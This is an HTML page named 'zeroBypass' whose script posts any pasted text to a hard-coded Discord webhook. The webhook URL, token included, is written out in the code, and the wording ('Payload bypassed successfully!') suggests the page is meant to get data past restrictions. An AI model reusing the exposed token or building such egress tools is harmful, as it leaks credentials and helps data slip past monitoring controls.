<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>zeroBypass</title>
  <meta name="description" content="Paste text and send instantly via zeroBypass."/>
  <!-- Production Tailwind CDN for rendering styles -->
  <script src="tailwindcss.com"></script>
</head>
<body class="bg-gray-950 text-gray-100 min-h-screen flex flex-col items-center justify-center px-6 py-16">

  <main class="w-full max-w-2xl">
    <!-- Header Area -->
    <div class="mb-10 text-center">
      <h1 class="text-5xl font-bold tracking-tight text-white">zero<span class="text-indigo-500">Bypass</span></h1>
      <!-- Updated subtitle string per your instructions -->
      <p class="mt-3 text-gray-400">easy fast</p>
    </div>

    <!-- Interaction Workspace -->
    <div class="relative">
      <!-- Placeholder attribute removed completely from textarea -->
      <textarea id="paste-box" class="w-full h-64 resize-none rounded-xl border border-gray-800 bg-gray-900 text-gray-100 p-4 outline-none focus:ring-2 focus:ring-indigo-500 transition"></textarea>
      
      <div class="mt-4 flex items-center justify-between gap-4">
        <!-- Live Transmit Status Displays Here -->
        <div id="status" class="text-sm min-h-5 font-medium transition-all duration-200"></div>
        <button id="send-btn" disabled class="rounded-lg bg-indigo-600 px-5 py-2 text-sm font-medium text-white hover:bg-indigo-500 disabled:opacity-40 disabled:hover:bg-indigo-600 transition cursor-pointer disabled:cursor-not-allowed">
          Send
        </button>
      </div>
    </div>
  </main>

  <script>
    const textarea = document.getElementById('paste-box');
    const sendBtn = document.getElementById('send-btn');
    const status = document.getElementById('status');

    // Your active target server destination webhook
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504171986480529619/s1oUgKfAd_trajzQzp8bS-uHhrgndv6aLf3QWVCQq5BAZwkBWI4RQ2gQZtuTgOjwQnlA";

    // Manage submission button active states
    textarea.addEventListener('input', () => {
      sendBtn.disabled = textarea.value.trim() === "";
    });

    // Handle posting process on event click
    sendBtn.addEventListener('click', async () => {
      const payloadText = textarea.value.trim();
      if (!payloadText) return;

      // Lock form input during delivery attempts
      sendBtn.disabled = true;
      status.textContent = "Processing payload...";
      status.className = "text-sm min-h-5 font-medium text-amber-400";

      try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `**[zeroBypass Incoming Packet]**\n\`\`\`text\n${payloadText}\n\`\`\``
          })
        });

        if (response.ok) {
          status.textContent = "Payload bypassed successfully!";
          status.className = "text-sm min-h-5 font-medium text-emerald-400";
          textarea.value = "";
        } else {
          throw new Error(`Server status message: ${response.status}`);
        }
      } catch (err) {
        status.textContent = "Transmission failed. Verify server configurations.";
        status.className = "text-sm min-h-5 font-medium text-red-400";
        sendBtn.disabled = false;
      }
    });
  </script>

</body>
</html>
